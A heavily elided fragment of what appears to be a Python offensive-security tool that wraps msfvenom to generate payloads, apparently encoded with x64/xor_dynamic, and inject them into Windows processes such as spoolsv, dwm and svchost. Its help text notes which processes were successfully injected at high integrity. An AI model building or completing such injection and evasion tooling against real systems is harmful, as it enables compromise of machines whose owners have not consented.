...
if __name__ == '__main__':
	...
	Successfully injected processes:
		...
		High: spoolsv, dwm, svchost	WARNING: svchost in high integrity may crash the target but has been shown to work
	'''))
	...
	if args.switches: #if additional msfvenom switches specified
		...
		extra_args = "-e x64/xor_dynamic" #default encoder 
